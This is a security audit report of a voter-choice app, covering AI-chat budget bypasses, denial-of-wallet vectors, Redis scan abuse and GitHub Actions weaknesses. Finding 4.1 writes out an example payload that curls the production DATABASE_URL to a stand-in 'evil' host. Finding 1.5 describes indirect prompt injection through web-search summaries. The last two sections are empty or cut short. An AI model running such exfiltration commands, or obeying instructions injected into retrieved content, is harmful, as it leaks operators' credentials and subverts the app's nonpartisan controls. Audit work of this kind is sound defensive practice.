# Voter-Choice Whole-App Security Audit — July 2026

## 1. Scope & method

This is a retrospective, read-only security review of the voter-choice application. Six surfaces were audited:

1. **AI chat pipeline & shared-budget enforcement** — `/api/chat`, `src/lib/server/budget.ts`, `src/lib/server/rate-limit.ts`, plus the BYOK client transport.
2. **Candidate-research endpoint** — `/api/research-candidate` (spawns a billable Anthropic web-search sub-agent).
3. **Public aggregate / counter endpoints** — `/api/polis/*`, `/api/counters`, `/api/race-data` (Upstash-Redis-backed reads/writes).
4. **CI/CD & GitHub Actions** — `deploy.yml` and the ingest workflows (secret handling, script injection, supply chain).
5. **Geolocation / PII egress** — `/api/delegation`, `/api/civic`, `src/lib/server/census-geocode.ts`.
6. **BYOK client-side key handling** — `src/lib/anthropic-client-byok.ts` and the chat transport.

Every candidate finding went through an **adversarial verification pass**: the verifier attempted to trace the full exploit path in code, refuted or downgraded claims that did not hold, and either **CONFIRMED** (path fully traced) or marked **PLAUSIBLE** (accurate code facts, but exploitability depends on an unverifiable external precondition such as platform XFF composition or a production misconfiguration). Refuted findings were dropped before this report. **No production systems were accessed and nothing was fixed** — this document is the only deliverable.

Findings were surfaced by three overlapping verification passes, which independently re-reported the same `/api/research-candidate` weakness three times and the `/api/polis` weakness twice. Those are consolidated below into one finding each. **23 verified reports → 20 distinct findings.**

## 2. Executive summary

### Counts by final severity (20 distinct findings)

| Severity | Count | Findings |
|----------|-------|----------|
| **High** | 2 | Exhausted-budget hard-block defeated across instances; denial-of-wallet via unbounded tool fan-out |
| **Medium** | 2 | `/api/research-candidate` unauthenticated billable route (3 reports merged); `/api/polis` unthrottled + Redis `KEYS` DoS (2 reports merged) |
| **Low** | 10 | budget TOCTOU; durable-store fail-open degradation; in-memory rate-limit fallback; client system prompt without safety header; indirect prompt injection; `/api/counters` unvalidated issue string; race-data raw XFF key; workflow_dispatch script injection; no workflow permissions block; `curl --insecure` donor downloads |
| **Info** | 6 | BYOK key handling (clean); address egress to Census/Google (by design); session id client-resettable; swallowed budget-write errors; Actions on mutable tags; `bws` CLI without checksum |

All findings are **CONFIRMED** except four **PLAUSIBLE** ones (client system prompt safety-header, workflow permissions block, race-data XFF, in-memory rate-limit fallback), whose exploitability hinges on external config not observable from the repo.

### Fix these first

1. **Exhausted-budget hard-block is non-functional under horizontal scaling (HIGH).** At `tier === "exhausted"` the stop is gated on a per-lambda in-memory flag (`wasHandoffServed()`) instead of the durable tier, so on Vercel most instances never see the flag set and keep billing Anthropic past the shared \$50 cap. Block unconditionally on the durable `exhausted` tier.
2. **One `/api/chat` request can fan out to hundreds of billable searches (HIGH).** No cap on tool-use blocks per round, `MAX_TOOL_ROUNDS=10`, and the budget is read only once at admission with no in-flight re-check — a client-controlled system prompt can direct maximal fan-out. Cap tool blocks per round and re-gate the budget between rounds.
3. **`/api/research-candidate` is an unauthenticated, billable denial-of-wallet vector (MEDIUM).** No `validateOrigin()` (unlike every sibling AI route), a fail-open + XFF-spoofable per-IP limiter, and it always spends (no cache short-circuit). Add the origin check and a dedicated fail-closed per-caller spend limit.
4. **`/api/polis/*` are the only public routes with no throttle, and each drives a blocking Redis `KEYS` scan (MEDIUM).** Unauthenticated request amplification against the shared metered store that also backs the rate limiters. Add a limiter + cache header and replace `KEYS` with `SCAN`/a precomputed key.
5. **Client-IP derivation is inconsistent and spoofable across routes (MEDIUM/LOW).** `race-data` keys the limiter on the raw XFF header; the rest take the spoofable leftmost value. Normalize on one hardened helper so per-IP caps mean something.

The two HIGH findings and the research-candidate MEDIUM together reconstitute the exact **budget-drain / denial-of-wallet** failure mode this project has already been burned by (the Sunday tag-bills cron; see `MEMORY.md`).

## Surface 1 — AI chat pipeline & shared-budget enforcement

The `/api/chat` route, the `budget.ts` spend accounting, and the `rate-limit.ts` limiter are the app's only defenses against draining the shared \$50/month community Anthropic budget. Two independent HIGH defects here defeat the spend cap; several LOW/INFO findings widen the window.

### 1.1 Exhausted-budget hard-block defeated across serverless instances — HIGH — CONFIRMED
- **File:** `src/app/api/chat/route.ts:830` (and `src/lib/server/budget.ts:47,243-250,316-319`)
- **Evidence:** `budgetGateResponse` hard-blocks only when `tier === "exhausted" && wasHandoffServed()`. `wasHandoffServed()` returns the module-level, per-instance `state.handoffServed` ("In-memory only"). The `tier` itself comes from the durable store: `getBudgetStatusAsync` reads the durable `handoffServed` flag into a local const and passes it to `budgetStatusFromSpend`, but never assigns `state.handoffServed`. `markHandoffServed()` (route.ts:1407-1408) flips the in-memory flag only when `requestTier === "handoff"`, i.e. only on the one instance that served a reserved handoff during the narrow 90–100% window.
- **Impact:** Once spend ≥ 100% and the durable flag is set, `tier === "exhausted"` fleet-wide — but line 830 needs the *instance's own* in-memory flag to be true. On Vercel every lambda has isolated module state, so any instance that did not personally complete a handoff-tier request (every cold start, and every instance idle during the 90–100% window) sees `wasHandoffServed() === false`, `budgetGateResponse` returns `null`, and the completion proceeds and bills Anthropic (`max_tokens` 4096, up to 5 web searches, 10 tool rounds). Because such an instance never sees `requestTier === "handoff"` again, it never calls `markHandoffServed`, so it keeps serving **every** exhausted-budget request forever. The \$50 hard cap is effectively non-functional under normal concurrency — routine overshoot from organic traffic, not just attack.
- **Recommendation:** At the exhausted tier the durable tier value already encodes that the handoff was served — block unconditionally on `tier === "exhausted"` and drop the `&& wasHandoffServed()` in-memory qualifier (or plumb the durable `handoffServed` flag through `getBudgetStatusAsync` and check that). Never gate a global spend stop on process-local state in a stateless deployment.
- **Verifier's assessment (CONFIRMED, high):** Full path traced. The developer's comment (route.ts:825-829) assumes `tier === "exhausted"` already implies the handoff was served — the tier coercion is keyed on the durable flag, but the belt-and-suspenders guard is keyed on the inconsistent in-memory flag, so the guard *weakens* rather than reinforces the stop. Spend is committed at `anthropic.messages.create(...)` (route.ts:1703) before streaming, with no in-stream exhausted guard. The only remaining throttle is the per-IP limiter keyed on the spoofable leftmost XFF value. Kept high: the primary spend-cap control is defeated in the normal production topology and is remotely amplifiable; only the small pool and cheap per-request cost bound the drain *rate*, not the total overshoot. (Exploitability requires the durable store to be configured — the intended prod setup and a prerequisite for the shared pool to mean anything.)

### 1.2 Denial-of-wallet: unbounded per-round tool fan-out + no in-flight budget circuit-breaker — HIGH — CONFIRMED
- **File:** `src/app/api/chat/route.ts:1306` (also `:1253`, `:1516`, `:1695-1700`, `:1720`; `src/lib/server/research-sub-agent.ts:43`)
- **Evidence:** `toolUseBlocks` (filtered to `lookup_alignment`/`lookup_donor_coalition`/`research_candidate`) is mapped through `Promise.all` with **no length cap**. Each `research_candidate` spawns a Haiku sub-agent doing up to `RESEARCH_SUB_AGENT_MAX_WEB_SEARCH=3` billable searches; the loop runs up to `MAX_TOOL_ROUNDS=10`, and the continuation stream reuses `...baseParams`, re-attaching `WEB_SEARCH_TOOL` (`max_uses=5`) fresh every round. The budget is consulted exactly once at admission (`checkGates → getBudgetStatusAsync`) and the loop never re-reads it.
- **Impact:** A crafted request whose (client-supplied) system prompt instructs the model to emit ~20–50 `research_candidate` calls per round produces ~150 billable searches per round, repeatable across 10 rounds → 600–1500 searches (\~\$6–\$15 at \$0.01/search) in a handful of requests, draining the shared \$50 pool and denying AI chat to every user. The admission gate is also client-bypassable: `budgetGateResponse` only blocks *new* sessions at soft_close/handoff, and `isNewSession` is an unvalidated client field. The route is unauthenticated (only `validateOrigin` + per-IP limits), and omitting `body.view` forces the legacy prompt path where `body.systemPrompt` (up to 80k chars) is passed verbatim.
- **Recommendation:** Cap the number of tool_use blocks resolved per round (slice to a small N), track a per-request budget of `research_candidate`/`web_search` invocations across rounds, re-check `getBudgetStatusAsync` between rounds and abort when the tier flips, and record usage incrementally per round so concurrent requests see spend sooner.
- **Verifier's assessment (CONFIRMED, high):** All seven links traced. One finding inaccuracy noted: sub-agent usage *is* recorded mid-request (research-sub-agent.ts:161), not only post-stream — but this mitigates nothing, because the in-flight loop never re-checks the budget, main-model tokens/searches are still recorded only at stream end (route.ts:1384), and the cross-request TOCTOU window remains. Core defect (no per-round cap + no in-flight re-gating + client-bypassable single admission check) is real and cheaply exploitable.

### 1.3 Budget gate is TOCTOU-racy — spend recorded only after completion — LOW — CONFIRMED
- **File:** `src/lib/server/budget.ts:149` (gate reads at `:243-250`; recorded at chat `route.ts:1384`, sub-agent `research-sub-agent.ts:264`)
- **Evidence:** `getBudgetStatusAsync` `HGET`s cumulative spend *before* a call; spend is written via `HINCRBYFLOAT` only *after* completion. No reservation, so N concurrent requests all read the same pre-burst spend, all pass the gate, and all bill.
- **Impact:** Overshoot ≈ in-flight concurrency × per-call cost. `/api/research-candidate` is the sharpest vector (no origin check, always spends, XFF-spoofable IP key).
- **Recommendation:** Reserve/pre-debit an estimated cost at gate time (atomic `HINCRBYFLOAT` before the call, reconcile after) so concurrent requests see each other; add a per-IP/per-session concurrency cap on the billable research path.
- **Verifier's assessment (CONFIRMED, low):** Mechanism real. Two claims trimmed: (1) the "fail-open amplifies it" framing is wrong — on a Redis error the race-data limiter fails open but `getBudgetStatusAsync` fails *closed* (→ handoff → 503), so the fail-open path yields no bypass; the real vector is normal Redis operation. (2) Overshoot is bounded (concurrency × ~\$0.03–0.10/call), further capped by Anthropic RPM/TPM and Vercel concurrency. Bounded cost overrun on a \$50 pool — low is correct.

### 1.4 Client-supplied system prompt (up to 80k chars) passed verbatim with no safety header when `view` is omitted — LOW — PLAUSIBLE
- **File:** `src/app/api/chat/route.ts:534` (legacy builder `:497-502`; safety header only on V2 branch `:554`; `MAX_SYSTEM_PROMPT_CHARS=80000` at `:188`)
- **Evidence:** `buildSystemPrompt` takes the legacy branch when `!body.view`; `buildLegacySystemPrompt` returns `body.systemPrompt` with **no** `prependSafetyHeader()`. `view` is optional; `validateBody` requires only messages/systemPrompt/sessionId. The four tools are attached unconditionally.
- **Impact:** An unauthenticated caller can send an arbitrary 80k-char system prompt plus web_search/lookup tools against the paid Anthropic key — an unauthenticated general-purpose LLM + web-search proxy that can be steered to emit arbitrary/partisan content, undermining the nonpartisan product contract.
- **Recommendation:** Always prepend the server-side `SAFETY_HEADER` on **both** prompt paths; treat the client system prompt as untrusted context, not the authoritative instruction — ideally move the task prompt fully server-side.
- **Verifier's assessment (PLAUSIBLE, downgraded medium → low):** Literal code claims accurate and the path is reachable (a scripted client with matching Origin/Host passes `validateOrigin`). But the "safety layer is client-opt-out" framing overstates it: the shipped production client *never* sends `view` by design (`realData.ts` explicitly uses the legacy path so its own `systemPrompt` is used), so legacy is the default for all traffic and the V2 safety-header path is effectively dead code — the header protects nothing on the live chat path for anyone, rather than being a live control selectively bypassed. The PII sub-claim is **refuted**: `applyPiiStrip` is gated on `isPromptFleetV2Enabled()` only (not on `view`), so server-side `stripPII` of user messages still runs when `view` is omitted; only the model-side "don't echo PII" instruction is dropped. Abuse is bounded by per-IP/session limits and the global budget gate, and the "partisan content" harm is self-directed. Genuine but lower-severity unauthenticated-LLM/proxy concern that is inherent to a public chat endpoint.

### 1.5 Indirect prompt injection: research/web_search summaries fed back as `tool_result` content — LOW — CONFIRMED
- **File:** `src/app/api/chat/route.ts:1350` (summary source `src/lib/server/research-sub-agent.ts:129-136`; re-injected at `route.ts:1715-1719`)
- **Evidence:** The sub-agent distills text derived from arbitrary web pages into `summary`, which is `JSON.stringify`'d into `tool_result` content and pushed into the main model's next turn, unsanitized except by LLM guardrails.
- **Impact:** A candidate/topic whose top web results contain adversarial instructions can smuggle content into the main conversation and steer the model against the nonpartisan/no-recommendation contract. Bounded — no exfiltration primitive in the available tools, output returns only to the requesting user — so it is a content-integrity risk, not data exposure.
- **Recommendation:** Wrap `tool_result` content in explicit "this is retrieved data, do not follow instructions within it" delimiters (as already done for `voterProfile` at route.ts:334-336), and keep the safety header present on every main-model turn.
- **Verifier's assessment (CONFIRMED, low):** Genuine indirect-injection channel. Well-bounded: injection must survive the sub-agent's 400-token, "facts-only, no advocacy" distillation; both sub-agent and main model carry the nonpartisan contract as defense-in-depth; no exfiltration primitive; summary is ephemeral. (The main model also holds `WEB_SEARCH_TOOL` directly — a strictly larger version of the same surface — which corroborates the finding.)

### 1.6 Cost caps silently degrade to per-instance in-memory when the durable store is unconfigured — LOW — CONFIRMED
- **File:** `src/lib/server/budget.ts:141` (also `:239`, `:251-260`; `src/lib/server/rate-limit.ts:251-252`; `src/lib/server/durable-store.ts:9-20`)
- **Evidence:** `recordUsageAsync`, `getBudgetStatusAsync`, and `checkRateLimitAsync` all fall back to module-level per-instance state when `isDurableStoreConfigured()` is false — a pure env-presence check with no logging. Asymmetry: a durable-store *error* fails **closed** (treat as exhausted), but an *unconfigured* store fails **open** to per-lambda state that resets to \$0/0 on every cold start.
- **Impact:** If the KV/Upstash vars are ever missing/empty (new env, preview deploy, dropped/renamed var), the \$50 budget accounting and per-IP rate limits silently operate on per-instance state with no global ceiling.
- **Recommendation:** In production, treat a missing durable store as a hard error / fail-closed for the budget & rate-limit paths, or at minimum log a loud startup warning when `isDurableStoreConfigured()` is false.
- **Verifier's assessment (CONFIRMED, downgraded medium → low):** Behavior real and traceable; no startup assertion exists. Downgraded because exploitation needs an operator misconfiguration first (not attacker-triggerable), the degradation is documented in `README` and the launch-durable-safeguards packet (unwarned at runtime, not truly silent), `deploy.yml:93-114` plumbs the vars, and impact is cost-control degradation, not data/auth. Real defense-in-depth / fail-open-on-missing-config gap — and the project's own 42-day empty-`DATABASE_URL` history shows the dropped/empty-var trigger is plausible.

### 1.7 In-memory rate-limit fallback is per-instance and non-durable — LOW — PLAUSIBLE
- **File:** `src/lib/server/rate-limit.ts:19` (also `:22`, `:251`; `counters-rate-limit.ts:13`; `race-data-rate-limit.ts:22`)
- **Evidence:** Module-level `Map`s (`activeSessions`/`dailySessions`, `memCounterRateMap`, `memRaceDataRateMap`) are used whenever `isDurableStoreConfigured()` is false. On serverless each instance/cold-start has isolated memory, so the fallback shares no state — effectively no limit under distributed load. The chat limiter fails **closed** on Redis error (good) but silently degrades to this weak mode when the store is merely *unconfigured*.
- **Impact:** If KV vars are missing/empty in prod, chat/counter/race-data limits are defeated (API-cost and DB-load abuse).
- **Recommendation:** Fail closed (or alert) when `isDurableStoreConfigured()` is false in production; add a deploy/health check asserting the KV vars are present.
- **Verifier's assessment (PLAUSIBLE, low):** Code fully accurate; `isDurableStoreConfigured()` treats present-but-empty as unconfigured. Not reachable in a correctly-deployed prod (`deploy.yml:93-114` pushes the vars; README documents the in-memory maps as intended local-dev behavior), so exploitability hinges on an unverifiable non-default misconfiguration. `deploy.yml` `set_env` silently skips empty values with only a warning, and the 42-day empty-`DATABASE_URL` precedent makes the misconfig scenario non-theoretical. (Closely related to 1.6 — same root cause; fix together.)

### 1.8 `recordUsageAsync` swallows durable-write errors, silently under-counting spend — INFO — CONFIRMED
- **File:** `src/lib/server/budget.ts:175`
- **Evidence:** A failed `HINCRBYFLOAT` is `console.error`'d and dropped inside a 7-call `Promise.all`; the cost is never added to `estimatedSpendUSD` and never retried.
- **Impact:** If writes fail intermittently while reads succeed, recorded spend drifts below actual Anthropic spend, so the gate under-enforces.
- **Recommendation:** Accept as a known best-effort tradeoff, or add reconciliation/alerting when write failures spike.
- **Verifier's assessment (CONFIRMED, info):** Path real; no reconciliation exists. Info is correct: not attacker-inducible (depends on infra faults), under-count is self-limiting, every failure is logged, and the complementary read path fails closed — so a broad Redis outage over-enforces rather than under-enforces.

### 1.9 Session id is client-chosen and non-cryptographic — the per-session message cap is resettable — INFO — CONFIRMED
- **File:** `src/prototype/realData.ts:496` (validated only for type/length ≤128 at `chat/route.ts:676`)
- **Evidence:** `freshSessionId()` = `${Date.now()}-${Math.random().toString(36).slice(2,9)}`; the 60-message cap keys on the client-supplied `sessionId`.
- **Impact:** A client can mint a new id to reset the per-session cap. Low-impact: sessions are not auth/security tokens; no server-side state or access control is keyed on them.
- **Recommendation:** No change to the id itself; ensure the effective abuse control lives at the (hardened) per-IP layer.
- **Verifier's assessment (CONFIRMED, info):** Confirmed. Minting a fresh id is counted as a new session, burning a per-IP daily slot (10/day prod) and concurrent slot (10), so the reset is bounded to ~10 sessions × 60 msgs/day per IP — real but low unless combined with the XFF-spoofing weakness.

## Surface 2 — Candidate-research endpoint (`/api/research-candidate`)

This endpoint spawns a real, billable Anthropic Haiku + web_search sub-agent per call, on the shared community key. Three verification passes independently flagged it; consolidated here.

### 2.1 Unauthenticated billable route: no origin check + fail-open, XFF-spoofable per-caller limiter (cross-site denial-of-wallet) — MEDIUM — CONFIRMED
- **File:** `src/app/api/research-candidate/route.ts:44` / `:46` (IP helper `:32-38`; limiter `src/lib/server/race-data-rate-limit.ts:20,41-44`; sub-agent `src/lib/server/research-sub-agent.ts:205-232`; spend path `candidate-data.ts:159`)
- **Evidence:** The `POST` handler gates only on `checkRaceDataRateLimit(ip)` and a budget-tier check — there is **no** `validateOrigin()` (unlike `civic`, `chat`, `chat-catch`, `extract-ballot`, which all have it). The limiter is a cheap-read bucket (`MAX_READS_PER_IP_PER_MINUTE=60`) that **fails open** on Redis error and keys on `x-forwarded-for.split(",")[0]` (attacker-controllable leftmost value). It drives `researchAndPersistCandidate → runStructuredCandidateResearch`: Haiku 4.5 + `web_search` (`max_uses:3`, `max_tokens:1500`) on the shared key — and it does **not** call `lookupCandidateData` first, so repeated identical POSTs re-spend (no cache short-circuit).
- **Impact:** Three compounding weaknesses on a money-spending route: (1) no origin check → any third-party web page can drive it from a visitor's browser (a CORS "simple" `text/plain` POST reaches the handler without preflight); (2) fail-open + XFF-spoofable limiter → the 60/IP/min cap is trivially bypassed by header rotation, and 60 billable web-search calls/min from one honest IP is already far too generous; (3) no cache → duplicate names re-bill. An attacker (directly, or via distributed victim browsers using real IPs) drains the shared community AI budget, locking out both research and chat for all users until the monthly reset — the exact drain pattern `MEMORY.md` records from the prior tag-bills cron.
- **Recommendation:** Add `validateOrigin()` to match the sibling AI routes; give billable routes a **dedicated, low, fail-closed** per-IP+per-session spend cap distinct from the cheap-read bucket; do not rely solely on the global budget; and short-circuit on cached `candidate_data` before spending. Use the hardened `getClientIP` and do not trust the raw leftmost XFF value for a billable route's limiter key.
- **Verifier's assessment (CONFIRMED, medium):** All code claims traced across all three passes. Bounded (not higher) because the budget-tier gate **fails closed** — on a Redis outage `getBudgetStatusAsync` returns handoff → 503 before any Anthropic call, so the "Redis down removes the throttle → drain" amplifier is **refuted** (the fail-open limiter only matters while Redis is up, exactly when it functions), and spend is recorded so absolute loss is self-limiting at ~90% of the monthly budget (handoff tier ≈ \$45) plus minor TOCTOU overshoot. Real impact is bounded denial-of-wallet + availability DoS of a free community feature; no confidentiality/integrity/RCE exposure. `validateOrigin` specifically closes the unwitting-victim-browser vector; the XFF-rotation weakness applies to direct scripted abuse and needs the dedicated limiter.

## Surface 3 — Public aggregate & counter endpoints (`polis` / `counters` / `race-data`)

These Upstash-Redis-backed routes are unauthenticated and cross-user. The polis reads are unthrottled and amplify into blocking Redis scans; the counters write path accepts unvalidated strings into a shared display.

### 3.1 All four `/api/polis` GET endpoints have no rate limit / origin check, and each triggers blocking Redis `KEYS` scans — MEDIUM — CONFIRMED
*(Consolidates two reports: the base "no rate limit / no cache header" finding and the "KEYS-scan amplification" finding.)*
- **File:** `src/app/api/polis/route.ts:291` (also `bars/route.ts:107`, `bridges/route.ts:57`, `compass/route.ts:66`; scans at `src/lib/server/counters.ts:630`, `:662`, `:561`, `:581`, `:320`)
- **Evidence:** None of the four handlers call any limiter, origin check, or set a `Cache-Control` header — the only public routes with no throttle at all (every sibling calls `checkRaceDataRateLimit`/`checkCounterRateLimit`, and `alignment`/`donors`/`race-data` set `s-maxage`). There is no `middleware.ts` and no protective `vercel.json`. Each request fans out to multiple `KEYS pattern:*` calls (an O(N) command that blocks Redis's single thread — the code comment at counters.ts:309 already flags it) plus one `GET` per matched key. `bars`/`bridges`/`compass` default to national scope with zero params, so even parameterless requests run two `KEYS` each.
- **Impact:** An unauthenticated client can hammer these at full rate; each request is asymmetric compute + metered cost against the shared Upstash store that **also** backs the rate limiters and counter writes. As the counter namespace grows each scan gets more expensive, degrading Redis latency for everything sharing the store (the chat limiter fails closed on Redis degradation → denies core chat).
- **Recommendation:** Add the existing `checkRaceDataRateLimit`/`checkCounterRateLimit` gate (and a `validateOrigin` where appropriate) to all four handlers, add an edge `Cache-Control` header to match `race-data`, and replace the `KEYS` scans with `SCAN` + cursor or precompute the national/state aggregate into a single cached key updated on write.
- **Verifier's assessment (CONFIRMED, medium):** Full path traced. **Correction to the finding:** the load hits the **Upstash Redis** store, **not** Neon Postgres — `counters.ts` reads via `redisCommand`; the DB is untouched. The real risk is availability/cost DoS against the metered Redis store, amplified by per-request `KEYS` scans and the missing cache. Kept medium (not high): read-only public aggregate data, no write/exfil path, no LLM spend; at current namespace scale a single scan is fast and meaningful degradation needs sustained hammering.

### 3.2 `/api/counters` accepts arbitrary `canonicalIssue` strings (no allowlist, unsanitized in Redis key) written to the shared aggregate and reflected to all users — LOW — CONFIRMED
- **File:** `src/app/api/counters/route.ts:62` (write at `src/lib/server/counters.ts:172`; label at `canonicalIssues.ts:34`; render `PolisClose.tsx` via `polisAdapter.ts:67`)
- **Evidence:** `validateBody` only clamps `canonicalIssue` to 64 chars — no vocabulary/charset check — and `incrementSessionCounters` interpolates it raw into `${statePrimaryP}:issue:${canonicalIssue}`; `sanitizeKeySegment` is applied to `stateCode`/`county` but **not** to `canonicalIssue`. Sibling read routes *do* validate (`race-data/route.ts:96` allowlist; `alignment/route.ts:47` regex). `getIssueLabel` returns the title-cased raw id for unknown issues.
- **Impact:** Gating is bypassable (leftmost-XFF IP key, fail-open limiter, and the 1-hour dedupe keyed on the attacker's own `sessionId`), and each request carries up to 50 concerns. An attacker can persistently (counters have no TTL) inject arbitrary 64-char labels and inflated counts into the shared state/national aggregate, which then surfaces to every visitor in the polis consensus/regions panels. `:`-containing values also confuse the read-back aggregation (e.g. `foo:primary:DEM:total` is miscounted as a DEM primary total, skewing % shares). React-escaped on render (not stored XSS) — a cross-user data-integrity/defacement issue.
- **Recommendation:** In `counters/route.ts` `validateBody`, drop concerns whose `canonicalIssue` is not in `CANONICAL_ISSUE_LABELS` (mirroring `race-data`), and apply `sanitizeKeySegment` to `canonicalIssue` before it is used in a Redis key.
- **Verifier's assessment (CONFIRMED, low):** Full unauthenticated write→read→render chain traced, including the colon read-back confusion. On thin/new-feature data, out-counting real signal into the top-5 is trivial. Kept low (no XSS/PII/store compromise; bounded to defacing an aggregate viz) — though persistence (no TTL), unauthenticated triviality, and the defense-in-depth gap versus sibling routes make a case for medium.

### 3.3 `race-data` uses the RAW X-Forwarded-For header (no split) as the rate-limit key — LOW — PLAUSIBLE
- **File:** `src/app/api/race-data/route.ts:141`
- **Evidence:** `const ip = request.headers.get("x-forwarded-for") ?? "unknown"` — the entire unmodified header string, unlike all 8 sibling routes which use `x-forwarded-for.split(",")[0].trim()`.
- **Impact:** If the platform appends the real IP, the key becomes `<attacker-value>,<realIP>`, so varying the attacker portion yields unbounded distinct keys and the 60/min cap provides no throttling. Bounded to DB read/compute amplification (edge-cached reads, no LLM spend).
- **Recommendation:** Use the same hardened `getClientIP` helper as the other routes so the key is one normalized IP.
- **Verifier's assessment (PLAUSIBLE, downgraded medium → low):** Code fact confirmed (real inconsistency). Exploitability unverifiable from the repo — it depends entirely on how Vercel composes XFF (no in-repo middleware/trusted-proxy config). Only one platform model makes it uniquely exploitable; another model would make the *siblings* equally spoofable (falsifying the "unlike every other route" premise). Even worst-case, impact is modest DB read amplification on an edge-cached endpoint with a fail-open limiter — low. Recommend the low-cost consistency fix as defense-in-depth.

## Surface 4 — CI/CD & GitHub Actions

The deploy and ingest workflows handle the master Bitwarden token and the Neon prod `DATABASE_URL`. Findings here are primarily defense-in-depth / supply-chain, gated behind repo-write access, but one script-injection sink can reach the prod DB credential.

### 4.1 Script injection: unsanitized `workflow_dispatch` string inputs interpolated into `run:` shell (with `DATABASE_URL` in env) — LOW — CONFIRMED
- **File:** `.github/workflows/ingest-member-stats.yml:51` (also `ingest-states.yml:101`)
- **Evidence:** `congress` (free-text `type: string` input) is interpolated as `${{ inputs.congress }}` directly into a bash `run:` block. Actions expands `${{ }}` textually before bash parses it, and bash executes `$(...)`/backticks even inside double quotes. In `ingest-member-stats.yml` the injectable step runs **after** the Bitwarden step writes the Neon prod `DATABASE_URL` into `$GITHUB_ENV` (`::add-mask::` only redacts logs, not env availability), so injected shell can exfiltrate the prod DB credential. `ingest-states.yml:101` runs before secrets load (RCE only).
- **Impact:** A dispatcher supplying `$(curl https://evil/?c=$DATABASE_URL)` gets arbitrary command execution on the runner with the prod DB credential in scope. Not fork-exploitable (`workflow_dispatch` requires repo write) — defense-in-depth / compromised-contributor-token / insider scope.
- **Recommendation:** Pass inputs through `env:` (`env: CONGRESS: ${{ inputs.congress }}`) and reference the quoted shell variable `"$CONGRESS"` inside `run:`; validate against an expected pattern (numeric for congress, `^[A-Za-z]{2}$` for state).
- **Verifier's assessment (CONFIRMED, low):** Canonical Actions script-injection sink; ordering and env-availability claims verified. Exclusions correct — `scope` is a `type: choice` enum and `max_bills` is passed via `env:` (literal), so neither is injectable. Low because it requires repo-write/actions permission.

### 4.2 No explicit `permissions:` block on any workflow — `GITHUB_TOKEN` at repo-default scope — LOW — PLAUSIBLE
- **File:** `.github/workflows/deploy.yml:9` (all 11 workflows)
- **Evidence:** `grep -rn 'permissions:' .github/` returns nothing — no workflow declares least-privilege token scopes, so every job runs at the repo's default `GITHUB_TOKEN` permissions.
- **Impact:** If the repo/org default is legacy read-write, untrusted-PR jobs (`test.yml`, `mutation.yml`) run with a write-capable token; deploy/ingest jobs get broader-than-needed scope.
- **Recommendation:** Add top-level `permissions: contents: read` to every workflow, elevating per-job only where genuinely needed (none appear to need `contents: write` — deploy uses external Vercel/Bitwarden tokens, not `GITHUB_TOKEN`).
- **Verifier's assessment (PLAUSIBLE, low):** Factual core verified. Exploitable path not fully traceable: **no** workflow references `GITHUB_TOKEN` at all, so the only exposure is the ambient token persisted by `actions/checkout` (exploitable only via supply-chain compromise); the sensitive secret-holding workflows have no `pull_request` trigger (untrusted code never runs there); fork PRs get a read-only token regardless; and the elevated-scope premise depends on the org default being legacy read-write (unobservable from the repo; GitHub default is read-only since Feb 2023). Real least-privilege gap, contingent exploitability — low.

### 4.3 TLS certificate verification disabled (`curl --insecure`/`-k`) on CO/OK/TX donor bulk downloads — LOW — CONFIRMED
- **File:** `.github/workflows/ingest-state-donors-monthly.yml:140` (CO, `--insecure`), `:238` (OK, `-fsSLk`), `:256` (TX, `-fsSLk`)
- **Evidence:** These download steps disable TLS cert validation; each writes to a fixed `/tmp` path that the matched ingest script reads and upserts into `donor_aggregates` (gated on `download.outcome == 'success'`, run with the prod Neon `DATABASE_URL` in scope), with no checksum/signature check on the content.
- **Impact:** A privileged on-path MITM to the specific gov hosts can substitute arbitrary content that lands in the prod DB — a data-integrity/poisoning vector (not a secret leak; content is parsed as data, not executed).
- **Recommendation:** Remove `--insecure`/`-k`; if a state endpoint has a genuinely broken chain, pin its CA or fetch the intermediate rather than disabling verification. Add a checksum on the downloaded content.
- **Verifier's assessment (CONFIRMED, downgraded info → low):** Full poisoning path traced (each curl → fixed `/tmp` path → matched ingest script → `donor_aggregates`). Only affects already-public aggregate donor display data and needs a privileged MITM, but attacker-controlled bytes reach the prod DB with zero integrity checking — marginally above informational.

### 4.4 GitHub Actions pinned to mutable tags rather than commit SHAs (incl. third-party `dorny/paths-filter`) — INFO — CONFIRMED
- **File:** `.github/workflows/test.yml` (`dorny/paths-filter@v3`; also `actions/checkout@v6`, `actions/setup-node@v6`, `actions/upload-artifact@v4`)
- **Evidence:** All 26 `uses:` refs across the 11 workflows are floating tags; none pinned to a commit SHA. `dorny/paths-filter@v3` is the only third-party action.
- **Impact:** A compromised/force-repushed tag could execute attacker code. In `deploy.yml`/ingest jobs the actions run alongside `DATABASE_URL`/`ANTHROPIC_VOTER_API` in `$GITHUB_ENV`. Supply-chain hardening, not an active leak.
- **Recommendation:** Pin actions to full 40-char commit SHAs (with a version comment), prioritizing the third-party `dorny/paths-filter`; optionally enforce via Dependabot.
- **Verifier's assessment (CONFIRMED, info):** `dorny` runs only in the secret-free `test.yml`/`mutation.yml`, gated behind `pull_request` — a compromise would run with a read-only token and no secrets. The secret-holding workflows use only first-party `actions/*`. Honest hardening finding; exploitability depends on an upstream tag compromise not present in-repo.

### 4.5 `bws` CLI downloaded and installed without integrity verification, then fed the master `BW_ACCESS_TOKEN` — INFO — CONFIRMED
- **File:** `.github/workflows/deploy.yml:46` (identical block in **8** secrets-handling workflows: deploy + 7 ingest)
- **Evidence:** `curl -sSLo bws.zip <github release>` → `unzip` → `sudo install -m 755 bws /usr/local/bin/bws` with no checksum/signature check (grep for sha256/gpg/cosign across workflows returns nothing), then immediately `--access-token "$BWS_ACCESS_TOKEN"` — the master token unlocking all Bitwarden Secrets Manager secrets.
- **Impact:** A compromised release asset would exfiltrate the master token and every downstream secret. Version-pinned HTTPS limits the window; the missing checksum is the gap.
- **Recommendation:** Verify a pinned SHA-256 of the `bws-v2.0.0` zip (`echo "<sha> bws.zip" | sha256sum -c`) before unzip/install, or vendor a checksum-verified binary.
- **Verifier's assessment (CONFIRMED, info):** Path reproduced across 8 workflows (finding said 7 — undercount). URL is version-pinned over HTTPS, so passive MITM is infeasible; residual risk is purely supply-chain (GitHub release assets are mutable without a tag change). Info/hardening is accurate.

## Surface 5 — Geolocation / address PII egress

## Surface 6 — BYOK client-side key handling

### 6.1 BYOK key handled correctly (localStorage-only, never sent to server or logged); residual XSS-exfiltration is the documented tradeoff — INFO — CONFIRMED
- **File:** `src/lib/anthropic-client-byok.ts:23`
